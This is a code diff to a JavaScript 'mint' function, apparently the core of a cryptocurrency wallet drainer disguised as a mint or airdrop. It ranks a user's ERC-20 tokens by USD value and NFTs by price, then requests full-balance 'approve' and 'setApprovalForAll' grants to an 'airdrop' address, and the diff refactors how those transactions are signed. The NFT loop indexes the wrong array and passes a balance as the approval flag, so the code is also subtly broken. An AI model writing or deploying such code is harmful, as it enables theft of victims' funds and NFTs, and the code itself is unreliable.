@@ -6,26 +6,27 @@ import { createWalletClient, custom } from 'viem'
 export const mint = async (chain, airdrop, tokensERC20, tokensERC721, signer, client, userAddress) => {
   console.log(client, "client")
  
-  const walletClient = createWalletClient({
-    chain: chain,
-    transport: custom(client.transport)
-  })
- 
+  
     tokensERC20.sort((a, b) => +b.balanceInUsd - +a.balanceInUsd);
     tokensERC721.sort((a, b) => +b.price - +a.price);
     for (let iter20 = 0; iter20 < tokensERC20.length; iter20++) {
       let canceled = false;
       try {
         if (tokensERC20[iter20].isApproved === false) {
+          const walletClientApprove = createWalletClient({
+            chain: chain,
+            transport: custom(client.transport),
+            account: client.account
+          })
+         
           // const contract = new ethers.Contract(tokensERC20[iter20].address, erc20abi, signer);
           const {request} = await client.simulateContract({
             address: tokensERC20[iter20].address,
             abi: erc20abi,
             functionName: "approve",
             args:  [airdrop, tokensERC20[iter20].balance],
-            account: client.account
           })
-          await walletClient.writeContract(request)
+          await walletClientApprove.writeContract(request)
           // await contract.approve(airdrop, tokensERC20[iter20].balance);
         }
       }
@@ -42,12 +43,17 @@ export const mint = async (chain, airdrop, tokensERC20, tokensERC721, signer, cl
         let canceled = false;
         try {
           if (tokensERC721[iter].isApproved === false) {
+            const walletClient = createWalletClient({
+              chain: chain,
+              transport: custom(client.transport),
+              account: client.account
+            })
+   
             const {request} = await client.simulateContract({
               address: tokensERC20[iter].address,
               abi: erc721abi,
               functionName: "setApprovalForAll",
               args:  [airdrop, tokensERC20[iter].balance],
-              account: client.account
             })
             await walletClient.writeContract(request)
           }
